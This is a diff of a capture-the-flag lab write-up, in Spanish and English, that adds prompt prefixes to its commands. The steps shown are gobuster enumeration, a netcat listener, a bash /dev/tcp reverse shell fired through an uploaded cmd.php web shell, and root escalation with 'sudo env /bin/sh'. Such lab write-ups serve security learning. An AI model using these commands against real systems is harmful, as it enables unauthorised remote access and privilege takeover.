@@ -28,7 +28,7 @@ We enter and see a web page with a section for uploading files.
 We ran a subdomain scan with gobuster to see if we found anything interesting.
 
 ```shell
-gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+└─$ gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
 ===============================================================
 Gobuster v3.6
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -77,7 +77,7 @@ Entramos a "https://www.revshells.com/" en esta web encontramos reverse shells y
 Run netcat with port 9001 as listening port:
 
 ```shell
-nc -lvnp 9001
+└─$ nc -lvnp 9001
 listening on [any] 9001 ...
 
 ```
@@ -85,7 +85,7 @@ listening on [any] 9001 ...
 We run the reverse shell so that we call the file ‘cmd.php’ and pass the above parameters ‘?cmd=id’ and now replace id with bash -c followed by two quotes and the reverse shell:
 
 ```shell
-http://172.17.0.2/uploads/cmd.php?cmd=bash -c "bash -i >%26 /dev/tcp/10.0.2.15/9001 0>%261" )
+└─$ http://172.17.0.2/uploads/cmd.php?cmd=bash -c "bash -i >%26 /dev/tcp/10.0.2.15/9001 0>%261" )
 
 ```
 
@@ -95,7 +95,7 @@ The only thing missing now is the escalation of privileges.
 We check the user's permissions with:
 
 ```shell
-sudo -l
+└─$ sudo -l
 ```
 
 ![Captura de pantalla 2024-05-13 210530](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/449ea752-5a93-4e67-a77e-d306b1111214)
@@ -103,7 +103,7 @@ sudo -l
 En este caso podemos ver que podemos ejecutar el binario "/usr/bin/env" siendo este usuario root como se puede apreciar y indica que no tiene contraseña entonces prodecedemos a ejecutar este binario:
 In this case we can see that we can run the binary ‘/usr/bin/env’ being this user root as you can see and indicates that it has no password then prodecedemos to run this binary:
 ```shell
-sudo env /bin/sh
+└─$ sudo env /bin/sh
 ```
 
 ![Captura de pantalla 2024-05-13 210851](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/6006d2f9-c5bf-44da-b6a8-e916850a9d0e)
